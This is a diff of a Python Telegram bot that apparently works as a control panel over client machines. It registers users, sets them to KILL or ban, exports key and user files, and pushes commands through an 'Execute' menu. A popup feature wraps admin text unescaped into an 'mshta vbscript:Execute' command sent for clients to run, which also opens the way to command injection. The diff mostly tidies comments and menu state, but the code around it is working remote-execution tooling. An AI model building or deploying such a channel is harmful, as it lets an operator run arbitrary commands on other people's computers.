@@ -28,7 +28,7 @@ KEYS_FILE = "KEYS.txt"
 USERS_FILE = "USERS.txt"
 USERS_BACKUP_FILE = "USERS_BACKUP.txt" # Added for the Undo Ban feature
 
-# State Constants (Added POPUP states)
+# State Constants
 (
     MENU_HUB,
     WAITING_FOR_REG,
@@ -219,8 +219,6 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
         await query.edit_message_text("✏️ **Rename User**\nStep 1: Send the **current** username:", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_RENAME_OLD
     if c == "m_exec": 
         await query.edit_message_text("⚡ **Execute**\nStep 1: Send Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_EXEC_USERS
-    
-    # NEW POPUP LOGIC
     if c == "m_popup":
         await query.edit_message_text("💬 **Popup Message**\nStep 1: Send Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_POP_USERS
 
@@ -240,19 +238,20 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
 
     if c == "m_backup":
         await query.edit_message_text("📤 **Sending backups directly to this chat...**", parse_mode="Markdown")
+        chat_id = update.effective_chat.id
         try:
-            chat_id = update.effective_chat.id
             if os.path.exists(USERS_FILE):
                 with open(USERS_FILE, 'rb') as f:
                     await context.bot.send_document(chat_id=chat_id, document=f)
             if os.path.exists(KEYS_FILE):
                 with open(KEYS_FILE, 'rb') as f:
                     await context.bot.send_document(chat_id=chat_id, document=f)
-            # Re-send the menu to the chat
-            await context.bot.send_message(chat_id=chat_id, text="✅ **Backups sent successfully!**", reply_markup=main_menu_keyboard(), parse_mode="Markdown")
+            # FIX: We keep the user in MENU_HUB so the buttons still work
+            await query.edit_message_text("✅ **Backups sent successfully!**", reply_markup=main_menu_keyboard(), parse_mode="Markdown")
+            return MENU_HUB
         except Exception as e:
-            await context.bot.send_message(chat_id=chat_id, text=f"❌ Error sending backups: {e}", reply_markup=main_menu_keyboard(), parse_mode="Markdown")
-        return ConversationHandler.END
+            await context.bot.send_message(chat_id=chat_id, text=f"❌ Error: {e}", reply_markup=main_menu_keyboard(), parse_mode="Markdown")
+            return MENU_HUB
 
     if c == "m_list":
         try:
@@ -262,7 +261,7 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
         await query.edit_message_text(msg, reply_markup=main_menu_keyboard(), parse_mode="Markdown"); return MENU_HUB
     
     if c == "m_help":
-        help_text = "🚀 **Help**\nKill: Set user status to KILL\nRename: Change a user's name\nDelete: Delete a User\nRegister: Add user\nGet Backups: Downloads Database\nUndo Ban All: Reverses an accidental mass ban\nPopup Msg: Triggers a VBScript popup"
+        help_text = "🚀 **Help**\nKill: Set user status to KILL\nRename: Change a user's name\nDelete: Delete a User\nRegister: Add user\nGet Backups: Downloads Database\nUndo Ban All: Reverses an accidental mass ban"
         await query.edit_message_text(help_text, reply_markup=main_menu_keyboard(), parse_mode="Markdown"); return MENU_HUB
     
     if c == "m_cancel": 
@@ -312,7 +311,6 @@ async def handle_exec_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
     count, _ = batch_update_users(context.user_data.get("exec_targets", ""), "SAFE", update.message.text)
     await update.message.reply_text(f"⚡ Modified {count} users."); return await start(update, context)
 
-# NEW POPUP HANDLERS
 async def handle_pop_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["pop_targets"] = update.message.text
     await update.message.reply_text("💬 **Step 2:** Send Message for Popup:", reply_markup=cancel_keyboard())
@@ -320,7 +318,6 @@ async def handle_pop_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_pop_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg_text = update.message.text.strip()
-    # Wraps text in VBScript msgbox command
     vbs_formatted = f'mshta vbscript:Execute("msgbox ""{msg_text}"",64,""System Message"":close")'
     count, _ = batch_update_users(context.user_data.get("pop_targets", ""), "SAFE", vbs_formatted)
     await update.message.reply_text(f"💬 Sent popup to {count} users."); return await start(update, context)
@@ -341,7 +338,6 @@ conv_handler = ConversationHandler(
         WAITING_FOR_RENAME_NEW: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_rename_new)],
         WAITING_FOR_EXEC_USERS: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_exec_users)],
         WAITING_FOR_EXEC_TEXT: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_exec_final)],
-        # Added Popup States
         WAITING_FOR_POP_USERS: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_pop_users)],
         WAITING_FOR_POP_TEXT: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_pop_final)],
         ConversationHandler.TIMEOUT: [MessageHandler(filters.ALL, timeout_handler), CallbackQueryHandler(timeout_handler)]
@@ -356,12 +352,9 @@ asyncio.set_event_loop(loop)
 
 async def init_app():
     await application.initialize()
-    
-    # Initialize Daily Backup Job at Midnight UTC (Requires apscheduler in requirements.txt)
     if application.job_queue:
         t = datetime.time(hour=0, minute=0, tzinfo=datetime.timezone.utc)
         application.job_queue.run_daily(send_daily_backup, time=t)
-        
     domain = os.environ.get("RAILWAY_PUBLIC_DOMAIN")
     if domain: await application.bot.set_webhook(url=f"https://{domain}/webhook")
 
